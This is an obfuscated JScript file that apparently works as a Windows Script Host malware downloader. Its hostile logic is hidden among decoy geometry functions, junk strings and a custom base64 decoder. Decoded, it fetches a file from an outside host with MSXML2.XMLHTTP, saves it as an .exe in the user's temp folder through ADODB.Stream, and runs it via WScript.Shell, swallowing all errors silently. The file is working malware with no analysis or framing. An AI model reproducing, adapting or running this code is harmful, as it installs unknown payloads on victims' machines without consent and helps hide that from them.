
var movers = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  horse = [];
	
var banned = { ':': '.','U': 'S','381': 'X'};
	var jamie = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function magnanimously(discuss) {
	spies = discuss;
	for (var i in banned){spies = spies.replace(i, banned[i]);}
    return spies;
};

var atlas = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.magnanimously4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("genesis").join("");
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = movers[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = movers[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = movers[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = movers[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var reminder ="genesisJVgenesisRFTVgenesisAl".magnanimously4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var retrieve = "genesisQWgenesisN0aXZgenesislWE9iagenesismVjdA=genesis=".magnanimously4();
String.prototype.magnanimously2 = function () {
    var princeton = {
        nirvana: this
    };
    princeton.abbeys = princeton.nirvana["c3Vic3RyaW5n".magnanimously4()](jamie, atlas);
    return princeton.abbeys;
};

var offer ="genesisRXhwYW5genesiskRW52aXgenesisJvbm1lbnRTdHJgenesispbmdz".magnanimously4();
var Native = function(options){
	
};
var deflected = [retrieve, offer,reminder,  ""+"."+("pride","fetching","commented","expires","supervise","idealist","mythological","parties","exe"), "UnVu".magnanimously4(), magnanimously("M"+"SX"+"ML"+("signing","illegal","abduction","bilious","totter","crispin","ephesians","2.")+"381M"+"LH"+"TT"+("fatherless","bible","volumes","assimilate","storage","matins","miles","consists","P>")+"WU"+("vagina","windward","mathematically","spokesman","fortification","metaphor","collar","cr")+("tracker","breakwater","tricks","cheaper","confirmation","attended","joker","obtaining","ip")+"t:"+("versus","showing","lender","height","empty","ricky","consolidation","scandinavia","Sh")+"ell")];
geordie = "_F2_";
var worthiness = this[deflected.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
JEHXkdV = "XSuNXWKCv";
bitch = (("relation", "limiting", "bygones", "impiety", "southeast", "bowled", "influx", "prBNNTWb") + "flzrLG").magnanimously2();
policies = (("relevant", "pertinent", "immaterial", "january", "judgment", "record", "worst", "constitutional", "arrow", "sraXcsycGFPW") + "AgffIDo").magnanimously2();
  
    String.prototype.raillery = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var peeing = deflected.pop().split(">");

significance = "b3Blbg==".magnanimously4();
var consumption = new worthiness(peeing[1]);
var dominant = new worthiness(peeing[0]);
var abbreviation = consumption[deflected.shift()](deflected.shift());
weasel = "E";

var psychology = deflected.shift();
var absolutism = deflected.shift();
function swingers(disquiet, coating) {

    try {
        var organisms = abbreviation + "/" + coating ;
		organisms = organisms+ psychology;
            dominant[significance](("dialog","playback","G" + weasel) + ("latin","civilian","scion","reminiscent","T"), disquiet, false);
       
    XwUKJV = "_F7_";
    dominant[policies + ("herring","dervish","end")]();
	var bubbles=("bitch" + WScript=="bitch" + "V2luZG93cyBTY3JpcHQgSG9zdA==".magnanimously4())&&dominant["c3RhdHVz".magnanimously4()] +""=="MjAw".magnanimously4()&&typeof(WJbFhNT)==="undefined";
	lQHNgR = "_F8_";
    if (bubbles) {
		
        var crumble = new worthiness((("stitch","transcript","concentrate","wouldbe","bulbous","market","estimated","forearm","A")+("candelabra","joins","guide","declared","listless","horizon","transatlantic","curriculum","SEOO")+"DB"+("speaking","mirthful","accords","responded","milky","monogram","satisfied",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        crumble[significance]();
        WLAdRoUiX = "_F9_";
        crumble.type = atlas;
        JASYgPNxFUU = "_F10_";
        crumble["d3JpdGU=".magnanimously4()](dominant[("grandpa","exchanges","assuming","bolster","cleveland","inversion","began","")+"R"+"es"+"pon"+banned['U'].toLowerCase()+"e"+"Qm9keQ==".magnanimously4()]);
        nrvoeV = "_F11_";
        crumble[(bitch + "o"+("cinnamon","euripides","libretto","qualifying","dickie","stack","puzzles","fraternity","00")+("latest","empire","circuitous","autonomous","butler","quantitative","convinces","8i")+"tion").replace("0"+("breton","awesome","champagne","giuseppe","terminal","editors","shoppers","08"), policies)] = 0;
        jOzFAisiz = "_F12_";
        crumble.saveToFile(organisms, 2);
        LdoWNavq = "_F13_";
        crumble.close();
        DkRIhYKRyiH = "_F14_";
		consumption[absolutism](organisms, atlas, true);
    }
} catch (jXDNhjTrP) { };

    HobSRFhyqY = "_F15_";
}
try{
swingers("aHR0cDovLw==".magnanimously4()+"\u0063\u006A\u0067\u006C\u006F\u0062\u0061\u006C"+"\u002E\u0063\u006F\u002F\u0033\u0067\u0033\u0034\u0074\u0033\u0074\u0034\u0074\u0067\u0067\u0072\u0074" + "?gstrgsGPqTY=SBeJiGQBYhP","CHnheJYRH");}catch(dEkvbQmBy){}

   IwhqMVXRzxX = "_F16_";
   